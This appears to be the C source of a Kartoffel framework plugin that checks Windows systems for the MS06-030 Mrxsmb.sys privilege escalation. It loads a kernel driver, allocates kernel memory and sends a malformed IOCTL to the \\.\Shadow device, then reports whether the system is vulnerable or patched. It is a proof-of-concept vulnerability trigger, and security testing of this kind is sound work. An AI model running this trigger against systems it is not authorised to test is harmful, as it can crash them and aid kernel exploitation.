

#include "stdafx.h"

#define MAGIC_IOCTL		0x141043

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}



 int Callback_Overview()
{
	printf("\n");
	printf("=================================================	\n");
	printf("		MS06-030 		\n");
	printf("       Mrxsmb.sys Privilege Escalation	\n");
	printf("=================================================	\n");
	printf("+ Vulnerability discovered by:\n");
	printf("  Ruben Santamarta\n");
	printf("+ K-plugin by: \n");
	printf("  Ruben Santamarta (reversemode.com)\n");
	printf("+ References:\n");
	printf("  www.reversemode.com\n");
	printf("  www.microsoft.com/technet/security/Bulletin/MS06-030.mspx\n\n");
	return 1;
}

int Callback_Direct( char *lpInitStr )
{
	KARTO_DIRS	kDirs;
	WCHAR		**lpDevices = NULL;
	LPVOID		pKern=0;
	HANDLE		hDevice,hKdevice;
	char		szKdriver[MAX_PATH];
	DWORD		outBuff[4]; 
	DWORD		dwNum = 0,i = 0, b=0, junk;
	BOOL		bVulnerable = FALSE;
	int			status=0;
	Callback_Overview();
	
	hKdevice = OpenKDevice();

	if (hKdevice == INVALID_HANDLE_VALUE) 
	{
		InitializePaths(&kDirs);
	
		sprintf(szKdriver,
				"%s\\kartoffel.sys",
				kDirs.KARTO_PATH);

		printf("\n\n[+] Kartoffel.sys not detected. Loading %s\n\n",szKdriver);
		if( !LoadDriver( szKdriver,"KartoffelDrv") )
		{
			printf("[!] Unable to load kartoffel.sys\n");
			exit(0);
		}
		
		hKdevice = OpenKDevice();
		
		if( hKdevice == INVALID_HANDLE_VALUE ) return FALSE;
	}
	printf("\n[+] Checking device...");
	hDevice = OpenDevice(L"\\\\.\\Shadow",
						TRUE,
						FALSE,
						FALSE,
						0,
						0);
	if( hDevice == INVALID_HANDLE_VALUE )
	{ 
		printf("Failed!\n");
		return FALSE;
	}
	printf("OK\n");
	pKern = kalloc( 0x20, 0);
	
	if( pKern )
	{
		memset(outBuff,0x0,0x10);
		kwrite( pKern, (LPVOID)outBuff, 0x10);
		printf("[+] Sending malformed request...");
		DeviceIoControl(hDevice,
						MAGIC_IOCTL,
						(LPVOID)outBuff,0x10,
						pKern,0x10,
						&junk,
						NULL);
		printf("OK\n");
		kread ( (LPVOID)outBuff,pKern, 0x10,FALSE);

		if( (HANDLE)outBuff[3]==INVALID_HANDLE_VALUE)
		{
			printf("\n**********************************\n");
			printf("\n[!!] This system is vulnerable\n\n");
			printf("**********************************\n");
			status=TRUE;
		}
	}

	CloseHandle(hDevice);
	CloseHandle(hKdevice);
	kglobalfree();

	if(!status) printf("\n[+] The driver seems to be patched\n");
	
	return status;
}